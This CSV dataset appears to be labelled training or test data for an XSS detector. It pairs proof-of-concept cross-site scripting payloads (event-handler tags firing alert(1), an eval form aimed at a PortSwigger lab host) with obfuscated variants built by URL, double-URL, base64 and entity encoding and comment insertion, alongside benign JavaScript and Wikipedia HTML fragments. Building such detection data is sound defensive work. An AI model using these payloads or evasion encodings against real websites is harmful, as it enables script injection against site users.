sample_id,label,payload_original,payload_obfuscated,generator,recipe
106,1,"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""xss via target in a form""></form>",%3Cform%20action%3D%22http%3A%2F%2Fsubdomain1.portswigger- labs.net%2Fxss%2Fxss.php%22%20target%3D%22alert%281%29%22%3E%3Cinput%20type%3Dhidden%20name%3Dx%20value%3D%22%27%3Beval%28name%29%2F%2F%22%3E%3Cinput%20type%3Dhidden%20name%3Dcontext%20value%3Djs_string_single%3E%3Cinput%20type%3D%22submit%22%20value%3D%22xss%20via%20target%20in%20a%20form%22%3E%3C%2Fform%3E,llm_style_t1.5,urlencode
107,1,"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",JTNDc3VwJTIwb25iZWZvcmVjb3B5JTNEJTIyYWxlcnQlMjgxJTI5JTIyJTIwY29udGVudGVkaXRhYmxlJTNFdGVzdCUzQyUyRnN1cCUzRQ==,llm_style_t1.5,urlencode+base64
108,0,} _animatein() { this._positiontooltip();,} _animatein() { this._positiontooltip();,llm_style_t1.5,none
109,0,}; }()); var getprefixedprop = (function () {,}; }()); var getprefixedprop = (function () {,llm_style_t1.5,none
110,1,"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",%3Cthead%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fthead%3E,llm_style_t1.5,urlencode
111,0,"<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>","<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>",llm_style_t1.5,none
112,1,"<div onbeforecut=""alert(1)"" contenteditable>test</div>",%25253Cdiv%252520onbeforecut%25253D%252522alert%2525281%252529%252522%252520contenteditable%25253Etest%25253C%25252Fdiv%25253E,llm_style_t1.5,double_urlencode+whitespace_noise+html_then_urlencode
113,1,<marquee onpointerup=alert(1)>xss</marquee>,PG1hcnF1ZWUgb25wb2ludGVydXA9YWxlcnQoMSk+  eHNzPC9tYXJxdWVlPg==,llm_style_t1.5,base64+whitespace_noise
114,1,<shadow onpointerover=alert(1)>xss</shadow>,%3Cshadow%20onpointerover%3Dalert%281%29%3Exss%3C%2Fshad/*OBF*/ow%3E,llm_style_t1.5,urlencode+comment_marker
115,0,"} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',","} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',",llm_style_t1.5,none
116,1,"<em ondblclick=""alert(1)"">test</em>",%3Cem%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fem%3E,llm_style_t1.5,urlencode
117,0,"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks","<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks",llm_style_t1.5,none
118,0,let indicator = document.createelement('li'),let indicator = document.createelement('li'),llm_style_t1.5,none
119,1,<tbody onpointermove=alert(1)>xss</tbody>,%253Ctbody%2520onpointermove%253Dalert%25281%2529%253Exss%253C%252Ftbody%253E,llm_style_t1.5,urlencode+html_then_urlencode
120,0,"key: ""render"", value: function render(year, month, randid) { var opts = this.options,","key: ""render"", value: function render(year, month, randid) { var opts = this.options,",llm_style_t1.5,none
121,0,"value: function rendertable(opts, data, randid) {","value: function rendertable(opts, data, randid) {",llm_style_t1.5,none
122,1,"<b onclick=""alert(1)"">test</b>",%3Cb%20onclick%3D%22alert%281%29%22%3Etest%3C%2Fb%3E,llm_style_t1.5,urlencode+whitespace_noise
123,1,<spacer onpointerup=alert(1)>xss</spacer>,JTNDc3BhY2VyJTIwb25wb2ludGVydXAlM0RhbGVydCUyODElMjklM0V4c3MlM0MlMkZzcGFjZXIlM0U%253D,llm_style_t1.5,urlencode+base64+double_urlencode
124,0,"<li><a href=""/wiki/artificial_general_intelligence"" title=""artificial general intelligence"">rtificial general intelligence </a> </li> </ul> </td>","<li><a href=""/wiki/artificial_general_intelligence"" title=""artificial general intelligence"">rtificial general intelligence </a> </li> </ul> </td>",llm_style_t1.5,none
125,0,let $closesttrigger = $(toel).closest('.dropdown-trigger'),let $closesttrigger = $(toel).closest('.dropdown-trigger'),llm_style_t1.5,none
126,0,"'taptarget.js', 'select.js', 'range.js'","'taptarget.js', 'select.js', 'range.js'",llm_style_t1.5,none
127,1,"<nextid onkeyup=""alert(1)"" contenteditable>test</nextid>",%253Cnextid%2520onkeyup%253D%2522alert%25281%2529%2522%2520content/*OBF*/ editable%253Etest%253C%252Fne/*OBF*/xtid%253E,llm_style_t1.5,double_urlencode+whitespace_noise+comment_marker
128,0,"return eventhandler.trigger(this._element, eventname, { relatedtarget: nextelement, direction: this._ordertodirection(order),","return eventhandler.trigger(this._element, eventname, { relatedtarget: nextelement, direction: this._ordertodirection(order),",llm_style_t1.5,none
129,0,"} this._element.focus() this._element.setattribute('aria-expanded', true)","} this._element.focus() this._element.setattribute('aria-expanded', true)",llm_style_t1.5,none
130,0,value: function _renderchip(chip) { if (!chip.tag) { return;,value: function _renderchip(chip) { if (!chip.tag) { return;,llm_style_t1.5,none
131,0,"<li><a href=""/wiki/ingenuity"" title=""ingenuity"">ingenuity </a> </li>","<li><a href=""/wiki/ingenuity"" title=""ingenuity"">ingenuity </a> </li>",llm_style_t1.5,none
132,0,"node.addeventlistener(eventname, callback); } function removeevent(node, eventname, callback) {","node.addeventlistener(eventname, callback); } function removeevent(node, eventname, callback) {",llm_style_t1.5,none
133,0,"_handlecarouseldrag(e) { let x, y, delta, deltay; if (this.pressed) {","_handlecarouseldrag(e) { let x, y, delta, deltay; if (this.pressed) {",llm_style_t1.5,none
134,1,<svg><animatetransform onend=alert(1) attributename=transform dur=1s>,%25253Csvg%25253E%25253Canimatetransform%252520onend%25253Dalert%2525281%252529%252520attributename%25253Dtransform%252520dur%25253D1s%25253E,llm_style_t1.5,double_urlencode+urlencode
135,0,$textarea = $($textarea); } if (!$textarea.length) {,$textarea = $($textarea); } if (!$textarea.length) {,llm_style_t1.5,none
136,0,"key: ""_removeeventhandlers"", value: function _removeeventhandlers() { this.el.removeeventlistener('click', this._handleinputclickbound);","key: ""_removeeventhandlers"", value: function _removeeventhandlers() { this.el.removeeventlistener('click', this._handleinputclickbound);",llm_style_t1.5,none
137,1,<discard onpointerover=alert(1)>xss</discard>,JTI2bHQlM0JkaXNjYXJkJTIwb25wb2ludGVyb3ZlciUzRGFsZXJ0JTI4MSUyOSUyNmd0JTNCeHNzJTI2bHQlM0IlMkZkaXNjYXJkJTI2Z3QlM0I%253D,llm_style_t1.5,html_then_urlencode+base64+double_urlencode
138,0,"body: 'when using sass, you can change the color scheme of your site extremely quickly.' }); window.index.add({","body: 'when using sass, you can change the color scheme of your site extremely quickly.' }); window.index.add({",llm_style_t1.5,none
139,0,scrolloffset -= this.dropdownoptions.clientheight / 2; // center in dropdown this.dropdownoptions.scrolltop = scrolloffset; },scrolloffset -= this.dropdownoptions.clientheight / 2; // center in dropdown this.dropdownoptions.scrolltop = scrolloffset; },llm_style_t1.5,none
140,0,"parent.insertbefore(i === 0 ? v : v.clonenode(true), sibling); }); });","parent.insertbefore(i === 0 ? v : v.clonenode(true), sibling); }); });",llm_style_t1.5,none
141,1,<rtc onpointermove=alert(1)>xss</rtc>,&lt;rtc onpoint/*OBF*/ermove=alert(1)&gt; xss&lt;/rtc&gt;,llm_style_t1.5,comment_marker+whitespace_noise+html_entities
142,0,"'sass/components/_materialbox.scss', 'sass/components/_modal.scss', 'sass/components/_navbar.scss',","'sass/components/_materialbox.scss', 'sass/components/_modal.scss', 'sass/components/_navbar.scss',",llm_style_t1.5,none
143,0,_this72._setupeventhandlers(),_this72._setupeventhandlers(),llm_style_t1.5,none
144,1,"<label draggable=""true"" ondragstart=""alert(1)"">test</label>","<  label d/* OBF*/raggable=""true"" ondragstart=""alert(1)"">test</label>",llm_style_t1.5,comment_marker
145,0,return; } this.ishovered = false;,return; } this.ishovered = false;,llm_style_t1.5,none
146,0,for (const domelement of domelements) { if (domelement !== target) { continue,for (const domelement of domelements) { if (domelement !== target) { continue,llm_style_t1.5,none
147,0,_maybeenablecycle() {,_maybeenablecycle() {,llm_style_t1.5,none
148,0,not: function (selector) { if (!selector) { return this;,not: function (selector) { if (!selector) { return this;,llm_style_t1.5,none
149,1,<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,%3Cq%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2Fq%3E%3Cinput%20autofocus%3E,llm_style_t1.5,urlencode
150,0,const tip = this._gettipelement(); tip.classlist.remove(class_name_show); if ('ontouchstart' in document.documentelement) {,const tip = this._gettipelement(); tip.classlist.remove(class_name_show); if ('ontouchstart' in document.documentelement) {,llm_style_t1.5,none
151,0,var dropdownbrect = this.dropdownel.getboundingclientrect(); var idealheight = dropdownbrect.height; var idealwidth = dropdownbrect.width;,var dropdownbrect = this.dropdownel.getboundingclientrect(); var idealheight = dropdownbrect.height; var idealwidth = dropdownbrect.width;,llm_style_t1.5,none
152,1,"<iframe oncopy=""alert(1)"" contenteditable>test</iframe>",%3Ciframe%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fiframe%3E,llm_style_t1.5,urlencode
153,0,dropdown.getorcreateinstance(this).toggle(); }); definejqueryplugin(dropdown);,dropdown.getorcreateinstance(this).toggle(); }); definejqueryplugin(dropdown);,llm_style_t1.5,none
154,0,"</p><p><a href=""/wiki/transhumanism"" title=""transhumanism"">transhumanism </a> (the merging of humans and machines) is explored in the <a href=""/wiki/manga"" title=""manga"">manga </a> <i><a href=""/wiki/ghost_in_the_shell"" title=""ghost in the shell"">ghost in the shell </a> </i> and the science-fiction series <i><a href=""/wiki/dune_(novel)"" title=""dune (novel)"">dune </a> </i>. in the 1980s, artist <a href=""/wiki/hajime_sorayama"" title=""hajime sorayama"">hajime sorayama </a>'s sexy robots series were painted and published in japan depicting the actual organic human form with lifelike muscular metallic skins and later ""the gynoids"" book followed that was used by or influenced movie makers including <a href=""/wiki/george_lucas"" title=""george lucas"">george lucas </a> and other creatives. sorayama never considered these organic robots to be real part of nature but always unnatural product of the human mind, a fantasy existing in the mind even when realized in actual form.","</p><p><a href=""/wiki/transhumanism"" title=""transhumanism"">transhumanism </a> (the merging of humans and machines) is explored in the <a href=""/wiki/manga"" title=""manga"">manga </a> <i><a href=""/wiki/ghost_in_the_shell"" title=""ghost in the shell"">ghost in the shell </a> </i> and the science-fiction series <i><a href=""/wiki/dune_(novel)"" title=""dune (novel)"">dune </a> </i>. in the 1980s, artist <a href=""/wiki/hajime_sorayama"" title=""hajime sorayama"">hajime sorayama </a>'s sexy robots series were painted and published in japan depicting the actual organic human form with lifelike muscular metallic skins and later ""the gynoids"" book followed that was used by or influenced movie makers including <a href=""/wiki/george_lucas"" title=""george lucas"">george lucas </a> and other creatives. sorayama never considered these organic robots to be real part of nature but always unnatural product of the human mind, a fantasy existing in the mind even when realized in actual form.",llm_style_t1.5,none
155,0,const event_click_data_api = `click${event_key}${data_api_key}`; class button extends basecomponent { static get name() {,const event_click_data_api = `click${event_key}${data_api_key}`; class button extends basecomponent { static get name() {,llm_style_t1.5,none
156,0,"this.$input[0].addeventlistener('focus', this._handleinputfocusbound)","this.$input[0].addeventlistener('focus', this._handleinputfocusbound)",llm_style_t1.5,none
157,1,"<source draggable=""true"" ondragstart=""alert(1)"">test</source>",%252526lt%25253Bsource%252520draggable%25253D%252526quot%25253Btrue%252526quot%25253B%252520ondragstart%25253D%252526quot%25253Balert%2525281%252529%252526quot%25253B%252526gt%25253Btest%252526lt%25253B%25252Fsource%252526gt%25253B,llm_style_t1.5,html_then_urlencode+double_urlencode
158,1,"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",PHN0eWxlPjp0YXJnZXQge2NvbG9yOiByZWQ7fTwvc3R5bGU+PHBhcmFtIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMTBzIiBvbnRyYW5zaXRpb25jYW5jZWw9YWxlcnQoMSk+PC9wYXJhbT4=,llm_style_t1.5,base64
159,0,ariaselected = 'true'; } if (opts.hasevent) {,ariaselected = 'true'; } if (opts.hasevent) {,llm_style_t1.5,none
160,1,"<mark onpaste=""alert(1)"" contenteditable>test</mark>",%26lt%3Bmark%20onpaste%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Bte%2F%2AOBF%2A%2Fst%2F%2AOBF%2A%2F%26lt%3B%2Fmark%26gt%3B,llm_style_t1.5,comment_marker+html_then_urlencode
161,0,this._isenabled = false,this._isenabled = false,llm_style_t1.5,none
162,0,this._initializetargetsandobservables(),this._initializetargetsandobservables(),llm_style_t1.5,none
163,0,return } const active = document.queryselector('.bd-aside .active'),return } const active = document.queryselector('.bd-aside .active'),llm_style_t1.5,none
164,0,} _handleclockclickstart(e) { e.preventdefault();,} _handleclockclickstart(e) { e.preventdefault();,llm_style_t1.5,none
165,0,"const order = index > activeindex ? order_next : order_prev; this._slide(order, items[index]); }","const order = index > activeindex ? order_next : order_prev; this._slide(order, items[index]); }",llm_style_t1.5,none
166,0,if (layoutviewport || !layoutviewport && strategy === 'fixed') {,if (layoutviewport || !layoutviewport && strategy === 'fixed') {,llm_style_t1.5,none
167,0,static get name() { return name$2; },static get name() { return name$2; },llm_style_t1.5,none
168,0,if (!object.keys(storeelementevent).length) { return; },if (!object.keys(storeelementevent).length) { return; },llm_style_t1.5,none
169,1,"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",PHhtcCBkcmFnZ2FibGU9InRydWUiIG9uZHJhZz0iYWxlcnQoMSkiPnRlc3Q8L3htcD4=,llm_style_t1.5,base64
170,1,<svg><small onload=alert(1)></small>,ll>sma></(1)ert=aloadonlll smag><<sv,llm_style_t1.5,reverse_chunks
171,0,if (oldyearselect) { m.formselect.getinstance(oldyearselect).destroy(); },if (oldyearselect) { m.formselect.getinstance(oldyearselect).destroy(); },llm_style_t1.5,none
172,0,if (typeof config.reference === 'object' && !iselement(config.reference) && typeof config.reference.getboundingclientrect !== 'function') {,if (typeof config.reference === 'object' && !iselement(config.reference) && typeof config.reference.getboundingclientrect !== 'function') {,llm_style_t1.5,none
173,1,"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>",JTI2bHQlM0JzdHlsZSUyNmd0JTNCJTQwa2V5ZnJhbWVzJTIweCU3QiU3RCUyNmx0JTNCJTJGc3R5bGUlMjZndCUzQiUyNmx0JTNCcnVieSUyMHN0eWxlJTNEJTI2cXVvdCUzQmFuaW1hdGlvbi1uYW1lJTNBeCUyNnF1b3QlM0IlMjBvbmFuaW1hdGlvbmVuZCUzRCUyNnF1b3QlM0JhbGVydCUyODElMjklMjZxdW90JTNCJTI2Z3QlM0IlMjZsdCUzQiUyRnJ1YnklMjZndCUzQg==,llm_style_t1.5,html_then_urlencode+whitespace_noise+base64
174,1,<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>,%253Cpicture%2520onblur%253Dalert%25281%2529%2520tabindex%253D1%2520id%253Dx%253E%253C%252Fpicture%253E%253Cinput%2520autofocus%253E,llm_style_t1.5,double_urlencode+whitespace_noise
175,0,"key: ""rendertitle"", value: function rendertitle(instance, c, year, month, refyear, randid) { var i = void 0,","key: ""rendertitle"", value: function rendertitle(instance, c, year, month, refyear, randid) { var i = void 0,",llm_style_t1.5,none
176,1,"<abbr onmouseleave=""alert(1)"">test</abbr>",%26lt%3Babbr%20onmouseleave%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btes/*OBF*/t%26lt%3B%2Fabbr%26gt%3B,llm_style_t1.5,html_then_urlencode
177,0,"api.addfiles(scssfiles, 'client', { isimport: true }); api.export('m', 'client'); });","api.addfiles(scssfiles, 'client', { isimport: true }); api.export('m', 'client'); });",llm_style_t1.5,none
178,1,<base onpointerdown=alert(1)>xss</base>,c2U+L2IvKk9CRiovYXNzPCk+eHQoMWxlcm49YWRvd3Rlcm9pbm9ucHNlIDxiYQ==,llm_style_t1.5,reverse_chunks+comment_marker+base64
179,0,} this.isopen = true; this.wrapper.classlist.add('open');,} this.isopen = true; this.wrapper.classlist.add('open');,llm_style_t1.5,none
180,1,"<rtc onmouseenter=""alert(1)"">test</rtc>",M+C9ydGZXN0PpIj50J0KDEmFsZXZXI9IlZW501vdX/*OBF*/NyBvbmPHJ0Y,llm_style_t1.5,base64+reverse_chunks+comment_marker
181,0,"addclassfor(scope_target, options.cssclasses.tap, options.animationduration)","addclassfor(scope_target, options.cssclasses.tap, options.animationduration)",llm_style_t1.5,none
182,0,"key: ""_setupeventhandlers"", value: function _setupeventhandlers() { this.el.addeventlistener('keydown', this._handletriggerkeydownbound);","key: ""_setupeventhandlers"", value: function _setupeventhandlers() { this.el.addeventlistener('keydown', this._handletriggerkeydownbound);",llm_style_t1.5,none
183,0,"const link = document.queryselector(`.bd-aside a[href=""${hash}""]`)","const link = document.queryselector(`.bd-aside a[href=""${hash}""]`)",llm_style_t1.5,none
